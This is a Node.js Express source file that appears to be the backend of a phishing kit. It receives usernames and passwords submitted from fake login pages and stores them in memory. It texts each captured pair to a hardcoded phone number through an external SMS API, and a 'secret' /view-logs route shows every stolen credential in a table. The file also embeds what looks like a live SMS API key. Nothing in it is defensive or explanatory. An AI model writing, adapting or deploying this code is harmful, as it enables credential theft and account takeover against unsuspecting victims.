const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// --- In-Memory Database to Store Credentials ---
const capturedCredentials = [];

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- SMS API Configuration ---
const SMS_API_URL = 'https://sms.onfonmedia.co.ke/api/v3/sms/send';
const SMS_API_KEY = 'qWtobnJAl8BaHvziOprPDVGwfk3mC6LRjN495YFIeQ0U7S12';
const SENDER_ID = 'MOBITEN-KE';
const RECIPIENT_NUMBER = '+254717005995';

// --- Function to Send SMS ---
async function sendSmsAlert(username, password) {
    const message = `New credentials captured!\nUsername: ${username}\nPassword: ${password}`;
    
    const payload = {
        apikey: SMS_API_KEY,
        senderID: SENDER_ID,
        recipient: RECIPIENT_NUMBER,
        message: message
    };

    try {
        const response = await axios.post(SMS_API_URL, payload);
        console.log('SMS sent successfully:', response.data);
    } catch (error) {
        console.error('Error sending SMS:', error.response ? error.response.data : error.message);
    }
}

// A simple route to test if the server is running
app.get('/', (req, res) => {
  res.send('Backend server is running!');
});

// The main route to handle credential submissions
app.post('/api/credentials', (req, res) => {
  const { username, password, page } = req.body;

  // --- Store credentials in the in-memory database ---
  const submission = {
    timestamp: new Date().toISOString(),
    username,
    password,
    page
  };
  capturedCredentials.push(submission);
  console.log('Credentials stored:', submission);

  // --- Send SMS Alert ---
  sendSmsAlert(username, password);

  res.status(200).json({ message: 'Credentials received successfully!' });
});

// --- SECRET ROUTE TO VIEW LOGS ---
app.get('/view-logs', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Captured Credentials</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; color: #333; margin: 0; padding: 20px; }
            .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            h1 { color: #1da1f2; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
            th { background-color: #1da1f2; color: white; }
            tr:nth-child(even) { background-color: #f2f2f2; }
            .no-creds { text-align: center; color: #888; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Captured Credentials Log</h1>
            <p>Refresh to view the latest submissions.</p>
            ${capturedCredentials.length === 0 
                ? '<p class="no-creds">No credentials captured yet.</p>' 
                : `
                    <table>
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Page</th>
                                <th>Username</th>
                                <th>Password</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${capturedCredentials.map(cred => `
                                <tr>
                                    <td>${cred.timestamp}</td>
                                    <td>${cred.page}</td>
                                    <td>${cred.username}</td>
                                    <td>${cred.password}</td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                `
            }
        </div>
    </body>
    </html>
  `);
});


